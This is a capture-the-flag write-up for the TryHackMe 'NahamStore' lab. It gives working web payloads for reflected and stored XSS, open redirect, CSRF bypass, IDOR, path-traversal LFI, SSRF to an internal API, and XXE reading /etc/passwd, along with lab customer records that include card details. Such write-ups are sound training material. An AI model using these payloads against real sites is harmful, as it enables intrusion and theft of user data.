# 77 - NahamStore

Room Link --> [https://tryhackme.com/room/nahamstore](https://tryhackme.com/room/nahamstore)

When enumerating subdomains you should perform it against the `nahamstore.thm`  domain.

### Enumeration

{% code overflow="wrap" %}
```bash
nmap -Pn -n -vv 10.10.176.114 -p- -T4 -sV

PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack
80/tcp   open  http    syn-ack nginx 1.14.0 (Ubuntu)
8000/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
```
{% endcode %}

### Sub-Domain Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
ffuf -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://nahamstore.thm -H "Host: FUZZ.nahamstore.thm" -fw 125

www
shop
marketing
stock
```
{% endcode %}

#### Gobuster dir enum (port 80)

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://nahamstore.thm -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,db,sql,bak -b 404,403

/search
/login
/register
/uploads
/staff
/css
/js
/returns
/logout
/basket
```
{% endcode %}

`stock.nahamstore.thm` .

THere is an endpoint here `/product` .

<figure><img src=".gitbook/assets/image (514).png" alt=""><figcaption></figcaption></figure>

`marketing.nahamstore.thm` .

<figure><img src=".gitbook/assets/image (515).png" alt=""><figcaption></figcaption></figure>

## Task 4 - XSS

{% code overflow="wrap" lineNumbers="true" %}
```bash
# dir enum for marketing.nahamstore.thm
gobuster dir -u http://marketing.nahamstore.thm -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,db,sql,bak,zip -b 404,403 --no-error -t 200 -ic
```
{% endcode %}

<figure><img src=".gitbook/assets/image (517).png" alt=""><figcaption></figcaption></figure>

So i tried the `error` parameter and found the XSS endopoint.

[http://marketing.nahamstore.thm/?error=\<script>alert("XSS")\</script](http://marketing.nahamstore.thm/?error=%3Cscript%3Ealert\(%22XSS%22\)%3C/script%3E)>

<figure><img src=".gitbook/assets/image (516).png" alt=""><figcaption></figcaption></figure>

### Stored XSS

_First Let us add the product to the basket._

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*vzP2Ek1DLPk427nvzVP_9w.png" alt="" height="272" width="700"><figcaption><p><em><strong>Click the add to basket</strong></em></p></figcaption></figure>

_Now click the **item**:_

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*o-mk-PruWW-Lp3cmyx8vzg.png" alt="" height="264" width="700"><figcaption><p><em><strong>Click the item</strong></em></p></figcaption></figure>

_On the item page if you did not add any address add it by clicking the **green color button**. As I have added an address so I am directly clicking the **blue button**._

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*0ER9c5egRjrc9W5cCfvc0g.png" alt="" height="269" width="700"><figcaption><p><em><strong>The item page</strong></em></p></figcaption></figure>

_After clicking the blue button. I have gone to the **/basket** page._

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*_op1_okBPbqb8CmwizhhsQ.png" alt="" height="303" width="700"><figcaption><p><em><strong>The basket page</strong></em></p></figcaption></figure>

Add credit card details and make payment: `1234123412341234` .

We can see our `User-Agent` info there.

<figure><img src=".gitbook/assets/image (518).png" alt=""><figcaption></figcaption></figure>

Putting an XSS payload in the `User-Agent` field works.

Use burpsuite to intercept the request, then change the "User-Agent" field to an XSS payload.

<figure><img src=".gitbook/assets/image (519).png" alt=""><figcaption></figcaption></figure>

And it worked.

<figure><img src=".gitbook/assets/image (520).png" alt=""><figcaption></figcaption></figure>

### HTML Tag Escape <a href="#html-tag-escape" id="html-tag-escape"></a>

_Let us enter a product. I have chosen the second one. I have add it to the **basket** and then went to the item page. After that, I clicked on the item and came to the below page._

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*XoMEByX85TSjBvEXz7Rouw.png" alt="" height="307" width="700"><figcaption></figcaption></figure>

_We see the URL: **http://nahamstore.thm/product?id=1\&name=Hoodie+++Tee**_

_Now let's try to change the data of the **name** parameter and put a random string. I have written name=abc. Command: **http://nahamstore.thm/product?id=1\&name=dking**_

<figure><img src=".gitbook/assets/image (521).png" alt=""><figcaption></figcaption></figure>

_Here we can see that we have changed the data of the **name** parameter but **nothing change occurs on the page**. So let us visit the **view page source**._

<figure><img src=".gitbook/assets/image (522).png" alt=""><figcaption></figcaption></figure>

We can escape from the `<title>` tag and run our payload. Intercept with burpsuite.

`http://nahamstore.thm/product?id=1&name=</title><script>alert("HTML Escape")</script>` .

<figure><img src=".gitbook/assets/image (523).png" alt=""><figcaption></figcaption></figure>

### JS Variable Escape

In the main page, search for a product "love"

<figure><img src=".gitbook/assets/image (524).png" alt=""><figcaption></figcaption></figure>

We can see the search term `love` appeared in a Javascript script. We can escape the `search` variable and get XSS using this payload.

`love';alert("JS Escape"); //` .

And we got XSS

<figure><img src=".gitbook/assets/image (525).png" alt=""><figcaption></figcaption></figure>

### Hidden Parameter

Hidden parameter in Homepage is `q` .

<figure><img src=".gitbook/assets/image (526).png" alt=""><figcaption></figcaption></figure>

### HTML Tag Escape

In the `return` page there is a `<textarea>` tag that we can escape to get XSS.

<figure><img src=".gitbook/assets/image (527).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (528).png" alt=""><figcaption></figcaption></figure>

Using this payload we get another XSS

`Large size </textarea><script>alert("RETURN Escape")</script>` .

<figure><img src=".gitbook/assets/image (529).png" alt=""><figcaption></figcaption></figure>

### Non-existing Endpoint

_Let us visit any URL which is not on the website. For example **http://nahamstore.thm/product**_

_The **URL** redirected us to the below page._

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Doing this gives us XSS

[http://nahamstore.thm/\<script>alert(123)\</script](http://nahamstore.thm/%3Cscript%3Ealert\(123\)%3C/script%3E)>

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>



### Hidden Param

_Visit one of the product pages:_

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*P3k4xVczxY4o5AYDtG5Nvg.png" alt="" height="309" width="700"><figcaption><p><strong>The page</strong></p></figcaption></figure>

_Just write something in the **discount** box and press the **Add to Basket** button._

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*EZs1FwNsYR__3hj2i8x2lw.png" alt="" height="192" width="700"><figcaption><p><strong>After writing in the discount box</strong></p></figcaption></figure>

_See that you cannot see anything in the **discount** box whatever you wrote._

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*c5GQg_xz36KXcYkqPVFYyg.png" alt="" height="287" width="700"><figcaption><p><strong>Nothing is shown</strong></p></figcaption></figure>

_Let us go to the **page source** and see nothing is written in the **value**._

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*9I19LB4msMUTOeIrJWkRFg.png" alt="" height="289" width="700"><figcaption><p><strong>The view source</strong></p></figcaption></figure>

_Nothing is written in the **value** parameter._

_Let us make a little bit of a change in the URL. let us make the **discount** variable **GET** method instead of the **POST** method. Command: **http://nahamstore.thm/product?id=1\&added=1\&discount=12345**_

_After the change see that the web page is showing the input of the **discount** you gave._

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*8cYl51h30nXYYiGgeF6fLg.png" alt="" height="284" width="700"><figcaption><p><strong>The discount value is showing</strong></p></figcaption></figure>

_Let us go to the **page source** and see the value written in the **value parameter** of the **discount** box._

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*ycAz2e1cD7uq3fQOd1hYkw.png" alt="" height="284" width="700"><figcaption><p><strong>The design code</strong></p></figcaption></figure>

_Now run the payload and let us make some changes in the design. Command : **http://nahamstore.thm/product?id=1\&added=1\&discount=12345" onmouseover=alert(document.cookie);//”**_

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*DAyBY7JVZ3eSHV3AMosaeQ.png" alt="" height="191" width="700"><figcaption><p><strong>The payload works</strong></p></figcaption></figure>

## Open Redirect

[https://pentester.land/blog/open-redirect-cheatsheet/#common-injection-points--parameters](https://pentester.land/blog/open-redirect-cheatsheet/#common-injection-points--parameters)

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)

### Parameter 1

Fuzzing using ffuf:

{% code overflow="wrap" lineNumbers="true" %}
```bash
ffuf -u 'http://nahamstore.thm/?FUZZ=http://10.18.88.214' -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -fs 4254

r
```
{% endcode %}

[http://nahamstore.thm/?r=http://10.18.88.214](http://nahamstore.thm/?r=http://10.18.88.214)

[http://nahamstore.thm/?r=https://google.com](http://nahamstore.thm/?r=https://google.com)

We get redirected to my local web server. Workw with "google.com" too.

### Parameter 2

_Let us recon on the URL: **http://nahamstore.thm/account/**_

_Command: **dirsearch -u http://nahamstore.thm/account/ -w /usr/share/wordlists/dirBuster\_list/directory-list-2.3-medium.txt**_

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*3WAfeVXR6Tq0wF3DdYILyA.png" alt="" height="217" width="700"><figcaption><p><strong>The recon</strong></p></figcaption></figure>

_This recon redirects us to and URL: **/login?redirect\_url=**_

_Let us visit the URL: **http://nahamstore.thm/login?redirect\_url=**_

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*m_cs_qHSgIdoVsig82nTLg.png" alt="" height="308" width="700"><figcaption><p><strong>The login page</strong></p></figcaption></figure>

_Now let us log in to the account of our own. But before that let us do this to the URL: **http://nahamstore.thm/login?redirect\_url=https://google.com** and then press the **login** with providing **email and password**._

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*qYqb2I2OVugL2vmhCEAMNg.png" alt="" height="306" width="700"><figcaption><p><strong>On the login page</strong></p></figcaption></figure>

_Let us log in. During login, it **redirected** me to the **Google website**. :_

<figure><img src="https://miro.medium.com/v2/1*0o8ncwhSLSyF06_PXV3Mzw.png" alt="" width="700"><figcaption><p><strong>The redirected website</strong></p></figcaption></figure>

Answer is --> `redirect_url` .

## CSRF

_Let us go to **Accounts->Settings.**_

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*zrtnNj4I2fasbOVgIyKOgA.png" alt="" height="275" width="700"><figcaption><p><strong>The setting page.</strong></p></figcaption></figure>

_Let us start **intercept on** the button of the **burp suite**._

_Now, let us visit the **Change Email** option and catch its traffic._

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*IUvKIAt4pYPdmzilVjt61Q.png" alt="" height="306" width="700"><figcaption><p><strong>The traffic of change email.</strong></p></figcaption></figure>

_Let us forward the **traffic** and see where it goes. It took us to the **/settings/email** page._

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*Q0EVPlABf8YTBuagPxYiKA.png" alt="" height="302" width="700"><figcaption><p><strong>The setting page</strong></p></figcaption></figure>

_Now click the **Change Email** and catch its traffic in the **burp suite**._

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*3epWpO6152U3MhO0hgHjYA.png" alt="" height="311" width="700"><figcaption><p><strong>The traffic of the /settings/email</strong></p></figcaption></figure>

_So this page is not the answer._

_Let us visit the second option **Change Password**._

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*YQvUECp7up4ZBgYDDq4Xdg.png" alt="" height="285" width="700"><figcaption><p><strong>The /settings/password page</strong></p></figcaption></figure>

_Let us click the **Change Password** option and catch its traffic in the **burp suite** and see it._

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*XJOIEWDHr3c_2hDPuLVahg.png" alt="" height="313" width="700"><figcaption><p><strong>There is no csrf token</strong></p></figcaption></figure>

_So this URL is the answer._ [_http://nahamstore.thm/account/settings/password_](http://nahamstore.thm/account/settings/password)

_**What field can be removed to defeat the CSRF protection**_

On the [email change page](http://nahamstore.thm/account/settings/email) there is a CSRF protection (hidden input field with an anti-CSRF token).

```html
<form method="post">
    <input type="hidden" name="csrf_protect" value="eyJkYXRhIjoiZXlKMWMyVnlYMmxrSWpvMExDSjBhVzFsYzNSaGJYQWlPaUl4TmpNeE1EUXdNREkySW4wPSIsInNpZ25hdHVyZSI6IjQyZWY1OWJlNTM2YTcxOTU5ZDQ0OGJmODc1N2Q1NDZhIn0=">
    <div><label>Email:</label></div>
    <div><input class="form-control" name="change_email" value="noraj@noraj.fr" ></div>
    <div style="margin-top:7px">
        <input type="submit" class="btn btn-success pull-right" value="Change Email"></div>
</form>
```

<figure><img src=".gitbook/assets/image (531).png" alt=""><figcaption></figcaption></figure>

Providing a wrong value will fail but removing the parameter will bypass the protection.

_Answer: **csrf\_protect**_

<figure><img src=".gitbook/assets/image (495).png" alt=""><figcaption></figcaption></figure>

It is encoded in `base64` .

## IDOR

_First, let us add something to the **Shopping basket** And then **add an address**._

On Burp Intercept, then click on the Address you just added.

<figure><img src=".gitbook/assets/image (497).png" alt=""><figcaption></figcaption></figure>

So just edit the `address_id` parameter to any number and you dump address details of other users.

<figure><img src=".gitbook/assets/image (496).png" alt=""><figcaption></figcaption></figure>

To exploit the second IDOR, you need to:

1. place and complete an order
2. go to the order page and select it
3. click on the `PDF Receipt` button

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*VXiMooDsTUYjUu2XoGf2zw.png" alt="" height="307" width="700"><figcaption><p><strong>The /account/orders/9 page</strong></p></figcaption></figure>

_Now let us on the **burp suite** and on the button **intercept on**._

_Now let us press the button **PDF Recept** and catch the **live traffic** of the page._

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*xW-tgXPo-7q2Li82JlZAmA.png" alt="" height="308" width="700"><figcaption><p><strong>The order receipt traffic</strong></p></figcaption></figure>

_Now let us change the **id** parameter to **3** and **forward** it._

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*xJPXIynUouRYKf9rRlOmaA.png" alt="" height="316" width="700"><figcaption><p><strong>The pdf page</strong></p></figcaption></figure>

_Here we see that the **order id** does not match the **user\_id.** So let us add the **user\_id** parameter in the traffic. Command: **what=order\&id=3\&user\_id=3**_

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*oXCjDf24AHjx5680Inq4EQ.png" alt="" height="312" width="700"><figcaption><p><strong>The pdf page</strong></p></figcaption></figure>

_It did not work. So let us use some other techniques. Command: **what=order\&id=3%26user\_id=3**_

The idea was to URL encode it `&` sign so that `3&user_id=3` becomes the value of `id`.

<figure><img src=".gitbook/assets/image (498).png" alt=""><figcaption></figcaption></figure>

Answer --> Order Date: `22/02/2021 11:42:13` .

## LFI

Add an item to the basket.

Turn on burpsuite intruder, then Clilck the item:

<figure><img src=".gitbook/assets/image (499).png" alt=""><figcaption></figcaption></figure>

_Now let us click the **forward** button_.

_When the bellow request will be shown send it to the **repeater**._

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*UtVnskI6x3hwKI5YX1nTCg.png" alt="" height="310" width="700"><figcaption><p><strong>The request</strong></p></figcaption></figure>

`/....//....//....//....//....//lfi/flag.txt` - This payload worked

<figure><img src=".gitbook/assets/image (500).png" alt=""><figcaption></figcaption></figure>

## SSRF

There is a _Check stock_ button on the product page.

<figure><img src=".gitbook/assets/image (501).png" alt=""><figcaption></figcaption></figure>

Catch it in Burp Intercept and forward  to Repeater.

<figure><img src=".gitbook/assets/image (502).png" alt=""><figcaption></figcaption></figure>

The `server` parameter value seems to be a domain name.

But if we put another value, we have an error about the bad server name so we must keep `stock.nahamstore.thm` and still find a way to bypass it.

With `server=stock.nahamstore.thm@127.0.0.1` we have a 404 for page

<figure><img src=".gitbook/assets/image (503).png" alt=""><figcaption></figcaption></figure>

But with `server=stock.nahamstore.thm@127.0.0.1#` we are hitting the home page.

<figure><img src=".gitbook/assets/image (504).png" alt=""><figcaption></figcaption></figure>

Let's try to discover an internal sub-domain:

{% code overflow="wrap" lineNumbers="true" %}
```bash
ffuf -u 'http://nahamstore.thm/stockcheck' -c -w /opt/SecLists/Discovery/DNS/dns-Jhaddix.txt -X POST -d 'product_id=2&server=stock.nahamstore.thm@FUZZ.nahamstore.thm#'

internal-api
```
{% endcode %}

We found one `internal-api.nahamstore.thm`

`server=stock.nahamstore.thm@internal-api.nahamstore.thm#` .

<figure><img src=".gitbook/assets/image (505).png" alt=""><figcaption></figcaption></figure>

We found an endpoint --> `/orders` .

```
{"server":"internal-api.nahamstore.com","endpoints":["\/orders"]}
```

Checking it out.

<figure><img src=".gitbook/assets/image (506).png" alt=""><figcaption></figcaption></figure>

```json
[
  {
    "id": "4dbc51716426d49f524e10d4437a5f5a",
    "endpoint": "\/orders\/4dbc51716426d49f524e10d4437a5f5a"
  },
  {
    "id": "5ae19241b4b55a360e677fdd9084c21c",
    "endpoint": "\/orders\/5ae19241b4b55a360e677fdd9084c21c"
  },
  {
    "id": "70ac2193c8049fcea7101884fd4ef58e",
    "endpoint": "\/orders\/70ac2193c8049fcea7101884fd4ef58e"
  }
]
```

We can check every order.

`server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders/4dbc51716426d49f524e10d4437a5f5a#` .

<figure><img src=".gitbook/assets/image (507).png" alt=""><figcaption></figcaption></figure>

We are seeing full details for other users.&#x20;

Checking 2nd order id.

`server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders/5ae19241b4b55a360e677fdd9084c21c#` .

<figure><img src=".gitbook/assets/image (508).png" alt=""><figcaption></figcaption></figure>

```json
{
  "id": "5ae19241b4b55a360e677fdd9084c21c",
  "customer": {
    "id": 2,
    "name": "Jimmy Jones",
    "email": "jd.jones1997@yahoo.com",
    "tel": "501-392-5473",
    "address": {
      "line_1": "3999  Clay Lick Road",
      "city": "Englewood",
      "state": "Colorado",
      "zipcode": "80112"
    },
    "items": [
      {
        "name": "Hoodie + Tee",
        "cost": "25.00"
      }
    ],
    "payment": {
      "type": "MasterCard",
      "number": "5190216301622131",
      "expires": "11\/2023",
      "CVV2": "223"
    }
  }
}
```

## XXE

_Let us visit the subdomain: **stock.nahamstore.thm**_

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*icpEcXSigmrC7mohvBHvEA.png" alt="" height="280" width="700"><figcaption><p><strong>The main page</strong></p></figcaption></figure>

_Let us visit the page **/product**. Command : **stock.nahamstore.thm/product**_

<figure><img src=".gitbook/assets/image (509).png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*My4ti-9W04d-cC97HlXiNQ.png" alt="" height="307" width="700"><figcaption><p><strong>In the burp repeater</strong></p></figcaption></figure>

_Let us change the request method from **GET** to **POST**._

<figure><img src=".gitbook/assets/image (510).png" alt=""><figcaption></figcaption></figure>

Now we FUZZ for allowed parameters on the Product, using `/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt` wordlist.

We see that the `xml` parameter returns.

<figure><img src=".gitbook/assets/image (511).png" alt=""><figcaption></figcaption></figure>

_Now let us copy the **XML** code from the **response** and paste it into the **request**._

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*Bym1Dx0kFCVdaPxq51-DXQ.png" alt="" height="309" width="700"><figcaption><p><strong>After pasting</strong></p></figcaption></figure>

_Now let us **send** the request again._

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*PNwIxGBYBJ_yTP6ST0aSEA.png" alt="" height="310" width="700"><figcaption><p><strong>The request</strong></p></figcaption></figure>

_**X-Token** is not present._

The error suggest we did not provide `X-Token` even if we have the HTTP header present. It means in XML mode the HTTP header is ignored and must be expecting a XML value.

{% code overflow="wrap" %}
```xml
// Some code# send this as request
<?xml version="1.0"?>
	<data>
	<X-Token>
d31ng
</X-Token>
	</data>l
```
{% endcode %}

Outputs

<figure><img src=".gitbook/assets/image (512).png" alt=""><figcaption></figcaption></figure>

Since the value we provided is reflected, the first thing that come to mind is to perform an XXE attack.

We can read the /etc/passwd file with this payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
	<data>
	<X-Token>
&test;
</X-Token>
	</data>
```

<figure><img src=".gitbook/assets/image (513).png" alt=""><figcaption></figcaption></figure>

Readin the 1st flag with:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///flag.txt'>]>
	<data>
	<X-Token>
&test;
</X-Token>
	</data>
```































